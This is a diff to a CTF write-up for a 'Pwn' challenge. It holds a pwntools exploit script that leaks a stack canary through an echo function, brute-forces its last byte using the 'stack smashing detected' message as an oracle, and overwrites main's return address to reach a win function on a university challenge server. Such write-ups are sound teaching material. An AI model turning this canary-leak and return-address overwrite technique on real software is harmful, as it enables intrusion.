@@ -5,7 +5,7 @@
 Pwn
 
 ## Vulnerability type
-TODO
+Memory corruption: buffer overflow
 
 ## Description
 Take a look at my new shell! It leverages the power of linux's multiplexing capabilities to provide a fast and responsive shell experience.
@@ -21,10 +21,6 @@ Inside gdb, by running the `disass main`, `disass echo` and `disass toUpper` com
 0x00000000004013d5 <+167>:   je     0x4013dc <toUpper+174>
 0x00000000004013d7 <+169>:   call   0x401060 <__stack_chk_fail@plt>
 ```
-
-First of all, it can be observed that the canary values are all equals. 
-To verify this, just place a breakpoint at the beginning of the `main` function (for example where the executable extract its PID) and run the `x/gx $rbp-0x8` command.
-Then, put a breakpoint inside one of the two other functions and by executing the same command, it is possible to notice that the two values are equals.
 
 In order to jump to the win function, it can be exploited the `return` instruction of the `main` function. 
 However, the `return` instructions of the two other functions are not viable options. 
@@ -82,65 +78,66 @@ Subsequently, upon encountering the return instruction, the program will jump to
 
 from pwn import * 
 from Crypto.Util.number import long_to_bytes
-import bash_basic_asynchronous_shell
 
-canary_offset = 72
-win_function = 0x00000000004011f6
+if __name__ == "__main__":
 
-# Connect to the server
-p = remote("cyberchallenge.disi.unitn.it", 50200)
+    canary_offset = 72
+    win_function = 0x00000000004011f6
 
-# Replace the null byte of the canary with a different byte so the printf function can print the canary
-p.sendlineafter(b"3. Exit\n", b"1")
-p.sendlineafter(b"Data to be echoed: \n", b"A" * canary_offset)
+    # Connect to the server
+    p = remote("cyberchallenge.disi.unitn.it", 50200)
 
-p.recvline()
+    # Replace the null byte of the canary with a different byte so the printf function can print the canary
+    p.sendlineafter(b"3. Exit\n", b"1")
+    p.sendlineafter(b"Data to be echoed: \n", b"A" * canary_offset)
 
-# Reconstruct the canary
-# It is not possible to retrieve all the 8 bytes of the canary due to the limitations of the printf canary that only prints 79 characters
-canary = b"\x00" + p.recv(6)
+    p.recvline()
 
-# Brute force the last byte of the canary
-# We use the toUpper function as oracle since it has not limitations on the characters in output (in terms of length)
-final_canary = None
+    # It is not possible to retrieve all the 8 bytes of the canary.
+    # This is due to the limitations of the printf inside the ehco function that only prints 79 characters
+    canary = b"\x00" + p.recv(6)
 
-for i in range(256):
-    b = long_to_bytes(i)
+    # Brute force the last byte of the canary
+    # We use the toUpper function as oracle since it has no limitations on the characters in output (in terms of length)
+    final_canary = None
 
-    print(" "*100, end="\r")
-    print(f"[{i}] Trying with: {b}", end="\r")
+    for i in range(256):
+        b = long_to_bytes(i)
 
-    # Generate a temporary canary with the new byte
-    tmp_canary = canary + b
-    tmp_canary = int.from_bytes(tmp_canary, "little")
-    
-    # Generate the payload
-    payload = b"A" * canary_offset + p64(tmp_canary)
+        print(" "*100, end="\r")
+        print(f"[{i}] Trying with: {b}", end="\r")
 
-    # Send the payload
-    p.sendlineafter(b"3. Exit\n", b"2")
-    p.sendlineafter(b"Data to be uppercased: \n", payload)
+        # Generate a temporary canary with the new byte
+        tmp_canary = canary + b
+        tmp_canary = int.from_bytes(tmp_canary, "little")
+        
+        # Generate the payload
+        payload = b"A" * canary_offset + p64(tmp_canary)
 
-    # Get the response message
-    line = p.recvuntil(b"2. Uppercase\n")
-    
-    # If this error appears, it means that the canary was modified -> incorrect canary
-    # If not, the canary was correct and we can use it
-    if "stack smashing detected" not in line.decode():
-        final_canary = canary + b
-        print(f"Leaked canary: {hex(tmp_canary)}")
+        # Send the payload
+        p.sendlineafter(b"3. Exit\n", b"2")
+        p.sendlineafter(b"Data to be uppercased: \n", payload)
 
-        break
+        # Get the response message
+        line = p.recvuntil(b"2. Uppercase\n")
+        
+        # If this error appears, it means that the canary was modified -> incorrect canary
+        # If not, the canary was correct and we can use it
+        if "stack smashing detected" not in line.decode():
+            final_canary = canary + b
+            print(f"Leaked canary: {hex(tmp_canary)}")
 
-# Inject payload with the correct canary
-# This time we also add 8 characters because it is the distance between the canary and the return instruction of the main function
-final_canary_int = int.from_bytes(final_canary, "little")
-payload = b"A" * canary_offset + p64(final_canary_int) + b"B" * 8 + p64(win_function)
+            break
 
-p.sendline(payload)
-p.sendlineafter(b"3. Exit\n", b"3")
+    # Inject payload with the correct canary
+    # This time we also add 8 characters because it is the distance between the canary and the return instruction of the main function
+    final_canary_int = int.from_bytes(final_canary, "little")
+    payload = b"A" * canary_offset + p64(final_canary_int) + b"B" * 8 + p64(win_function)
 
-flag = p.recvline_contains(b"Congratulations! Here is the flag:")
-flag = flag.decode().split(":")[1].strip()
+    p.sendline(payload)
+    p.sendlineafter(b"3. Exit\n", b"3")
 
-print(flag)
+    flag = p.recvline_contains(b"Congratulations! Here is the flag:")
+    flag = flag.decode().split(":")[1].strip()
+
+    print(flag)
